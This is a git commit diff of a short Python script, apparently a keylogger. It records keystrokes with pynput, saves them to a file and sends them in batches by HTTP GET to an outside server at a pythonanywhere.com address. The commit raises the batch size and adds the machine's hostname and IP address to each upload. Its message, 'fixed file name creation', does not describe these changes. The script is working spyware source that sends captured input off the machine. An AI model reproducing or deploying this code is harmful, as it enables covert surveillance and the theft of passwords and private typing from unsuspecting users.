f133b5f7549bcd30cd7712a0bed266d2e8117ae0
Samhith-k <39161002+Samhith-k@users.noreply.github.com>
2020-07-25 22:59:27 +0530

    fixed file name creation

--- exp.py
+++ exp.py
@@ -1,14 +1,16 @@
 from pynput.keyboard import Key, Listener
-import requests 
+import requests
+import socket 
 URL = "http://samhith.pythonanywhere.com/send"
-
+host_name = socket.gethostname() 
+host_ip = socket.gethostbyname(host_name)
 count = 0
 keys=[]
 def on_press(key):
     global keys, count
     keys.append(key)
     count += 1
-    if count >= 10:
+    if count >= 30:
         count=0
         write_file(keys)
         
@@ -19,7 +21,7 @@ def write_file(keys):
             s="".join(map(str,keys))
             s.replace("'","")
             f.write(s+"\n")
-            r=requests.get(url = URL, params = {'data':s+"\n"})
+            r=requests.get(url = URL, params = {'data':s+"\n","host_name":host_name,"host_ip":host_ip})
             #print(r.json())
 
 def on_release(key): 
